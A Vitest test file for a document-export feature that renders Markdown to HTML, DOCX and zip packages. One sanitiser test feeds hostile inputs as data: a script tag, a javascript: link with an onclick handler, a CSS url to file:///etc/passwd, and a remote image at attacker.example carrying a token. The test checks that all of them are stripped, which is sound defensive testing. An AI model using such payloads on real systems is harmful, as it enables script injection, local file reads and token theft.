import { resolve } from "node:path";
import { describe, expect, test } from "vitest";
import { unzipSync, strFromU8 } from "fflate";
import { readFileSync } from "node:fs";
import { compileDocument } from "../app/features/document-export/documentCompiler";
import { compileArtifactDocument } from "../app/features/document-export/artifactExportAdapter";
import { renderDocumentHtml } from "../app/features/document-export/documentHtml";
import { renderMarkdownPackage } from "../app/features/document-export/documentMarkdown";
import { renderDocumentDocx } from "../app/features/document-export/documentDocx";
import { renderExportDocument } from "../app/features/document-export/documentExportService";
import { createSpatialAtlas } from "../app/features/document-export/spatialAtlas";
import { safeDocumentStem, defaultExportOptions } from "../app/features/document-export/documentExport.types";
import { createThinReadingFixture } from "./fixtures/thinReadingFixtures";
import { createThinReadingDocument } from "../app/features/thin-reading/thinReadingProjection";
const plain = (nodes: any[]): string => nodes.map(node => node.value ?? plain(node.children ?? [])).join(" ");
const fixture = readFileSync(resolve("../../../../development/test-data/document-export/mixed-research.md"), "utf8");

describe("unified document export", () => {
  test("retains paragraphs, lists, merged tables, code tail and math across the shared tree and editable DOCX", async () => {
    const document = await compileDocument({ title: "混合研究报告", markdown: fixture, options: { acceptDegradations: true } });
    const html = renderDocumentHtml(document);
    expect(html).toContain("<table>"); expect(html).toContain('colspan="2"'); expect(html).toContain("<math");
    expect(html).toContain("TAIL_EXPORT_MARKER"); expect(html).toContain("CODE_LAST_LINE");
    const bytes = await renderDocumentDocx(document);
    const files = unzipSync(bytes), xml = strFromU8(files["word/document.xml"]);
    expect(xml).toContain("<w:tbl>"); expect(xml).toContain('w:gridSpan w:val="2"');
    expect(xml).toContain("<m:f>"); expect(xml).toContain("<m:rad>");
    expect(xml).toContain("TAIL_EXPORT_MARKER"); expect(xml).toContain("CODE_LAST_LINE");
    expect(xml).toContain("<w:numPr>"); expect(xml).toContain("<w:headerReference"); expect(xml).toContain("<w:footerReference");
    const relationships = strFromU8(files["word/_rels/document.xml.rels"]);
    expect(relationships).not.toContain("file:"); expect(relationships).not.toContain("vbaProject");
  });
  test("packages real relative image files and a hash manifest for offline migration", async () => {
    const jpeg = readFileSync(resolve("../../../../development/test-data/document-export/orientation.jpg"));
    const document = await compileDocument({ title: "图文", markdown: `# 图文\n\n![方向图](data:image/jpeg;base64,${jpeg.toString("base64")})\n\n末段` });
    const result = await renderMarkdownPackage(document);
    expect(result.extension).toBe("zip"); expect(result.mimeType).toBe("application/zip");
    const files = unzipSync(result.bytes), markdown = strFromU8(files["document.md"]);
    const path = /!\[方向图\]\((assets\/[^)]+)\)/.exec(markdown)![1];
    expect(files[path]).toEqual(new Uint8Array(jpeg)); expect(markdown).not.toContain("data:image");
    expect(JSON.parse(strFromU8(files["manifest.json"])).assets[0].sha256).toBe(document.assets[0].sha256);
    const docx = unzipSync(await renderDocumentDocx(document));
    expect(Object.keys(docx).some(path => path.startsWith("word/media/"))).toBe(true);
    expect(strFromU8(docx["word/document.xml"])).toContain("<w:drawing>");
  });
  test("blocks scripts, handlers, hostile CSS/protocols and remote image reads without fetching", async () => {
    const document = await compileDocument({ title: "注入", markdown: `<script>PRIVATE_SCRIPT()</script>\n\n<a href="javascript:alert(1)" onclick="evil()">链接</a>\n\n<div style="background:url(file:///etc/passwd)">正文</div>\n\n![远程图](https://attacker.example/secret?token=private)` });
    const html = renderDocumentHtml(document);
    expect(html).not.toContain("PRIVATE_SCRIPT"); expect(html).not.toContain("onclick"); expect(html).not.toContain("javascript:"); expect(html).not.toContain("file:"); expect(html).not.toContain("attacker.example"); expect(html).not.toContain("token=private");
    expect(document.diagnostics.map(issue => issue.code)).toContain("missing_asset");
    await expect(renderExportDocument(document, "markdown")).rejects.toThrow("确认");
    document.options.acceptDegradations = true;
    const result = await renderExportDocument(document, "markdown");
    expect(result.receipt!.diagnostics.some(issue => issue.code === "missing_asset")).toBe(true);
  });
  test("never reuses a preview truncation or silently loses over-budget tail content", async () => {
    const text = `# 长文\n\n${("正文段落。".repeat(60) + "\n\n").repeat(1000)}FULL_SOURCE_LAST_NODE`;
    const document = await compileDocument({ title: "长文", markdown: text });
    expect(plain(document.nodes)).toContain("FULL_SOURCE_LAST_NODE");
    await expect(compileDocument({ title: "超预算", markdown: "x".repeat(8 * 1024 * 1024 + 1) })).rejects.toThrow("8 MiB");
  });
  test("freezes artifact bytes before await and preserves v2 body formatting and explicit evidence modes", async () => {
    const thin = structuredClone(createThinReadingDocument(createThinReadingFixture()));
    thin.nodes[thin.rootNodeId].summary = "第一段。\n\n- 项目 A\n- 项目 B\n\n```ts\nconst END = 1;\n```";
    thin.nodes[thin.rootNodeId].evidence.paperEvidenceSpans![0].quote = `开头 ${"证据 ".repeat(400)} COMPLETE_EVIDENCE_TAIL`;
    const tab = { artifactId: "frozen", type: "thin_reading" as const, title: "薄读", thinReadingDocument: thin };
    const pending = compileArtifactDocument(tab, { options: { evidenceMode: "full_appendix" } });
    tab.thinReadingDocument.nodes[thin.rootNodeId].summary = "来源更新后的内容";
    const document = await pending, html = renderDocumentHtml(document);
    expect(html).toContain("<ul>"); expect(html).toContain("const END = 1;"); expect(html).toContain("COMPLETE_EVIDENCE_TAIL"); expect(html).not.toContain("来源更新后的内容");
    const source = document.sources[0]; expect(source.state).toBe("legacy-unpinned"); expect(source.revision).toBeUndefined();
    await expect(compileArtifactDocument(tab, { options: { scope: "selected_nodes", nodeIds: ["missing"] } })).rejects.toThrow("有效");
  });
  test("requires explicit DOCX formula downgrade and preserves unsupported TeX", async () => {
    const document = await compileDocument({ title: "公式", markdown: "$$\n\\begin{matrix}a&b\\\\c&d\\end{matrix}\n$$" });
    await expect(renderDocumentDocx(document)).rejects.toThrow("确认");
    document.options.acceptDegradations = true;
    const files = unzipSync(await renderDocumentDocx(document));
    expect(strFromU8(files["word/document.xml"])).toContain("begin{matrix}");
    expect(document.diagnostics.some(issue => issue.code === "math_not_editable")).toBe(true);
  });
  test("rejects browser background PDF rather than returning image PDF as a report", async () => {
    const document = await compileDocument({ title: "PDF", markdown: "# PDF\n\n正文" });
    await expect(renderExportDocument(document, "pdf")).rejects.toThrow("系统打印");
  });
  test("uses model coordinates for multi-page atlases and keeps referenced full bodies", () => {
    const placements = [{ placementId: "p", revision: "r", boardId: "b", ref: { objectId: "o", revision: "r" }, position: { x: -200, y: 0 }, size: { width: 1800, height: 1200 }, viewId: "text", collapsed: true }];
    const options = { ...defaultExportOptions, profileId: "spatial-atlas/v1" as const };
    const atlas = createSpatialAtlas(placements, [], {}, options);
    expect(atlas.pages.length).toBeGreaterThan(1); expect(atlas.pages[0].x).toBe(-200);
    expect(createSpatialAtlas(structuredClone(placements), [], {}, options)).toEqual(atlas);
  });
  test("preserves footnote references and definitions as Markdown and real Word footnotes", async () => {
    const document = await compileDocument({ title: "脚注", markdown: "正文[^note]。\n\n[^note]: 完整脚注 LAST_FOOTNOTE" });
    const markdown = new TextDecoder().decode((await renderMarkdownPackage(document)).bytes);
    expect(markdown).toContain("[^note]"); expect(markdown).toContain("[^note]:");
    const files = unzipSync(await renderDocumentDocx(document));
    expect(strFromU8(files["word/document.xml"])).toContain("w:footnoteReference");
    expect(strFromU8(files["word/footnotes.xml"])).toContain("LAST_FOOTNOTE");
  });
  test("preserves grouped powers, combined scripts and editable sums instead of changing the mathematics", async () => {
    const document = await compileDocument({ title: "OMML", markdown: "$$\n{a+b}^2 + \\sum_{i=1}^{n}{x_i ^2} + \\sqrt[3]{x}\n$$" });
    const files = unzipSync(await renderDocumentDocx(document)), xml = strFromU8(files["word/document.xml"]);
    expect(xml).toContain("<m:nary>"); expect(xml).toContain("<m:sSubSup>"); expect(xml).toContain("<m:deg>");
    expect(xml).toMatch(/<m:sSup>[\s\S]*<m:e>[\s\S]*<m:t>a<\/m:t>[\s\S]*<m:t>\+<\/m:t>[\s\S]*<m:t>b<\/m:t>[\s\S]*<\/m:e>/);
  });
  test("handles Windows reserved names and trailing dots/spaces", () => {
    expect(safeDocumentStem("CON")).toBe("Liteasy-CON"); expect(safeDocumentStem("文档. ")).toBe("文档");
  });
});
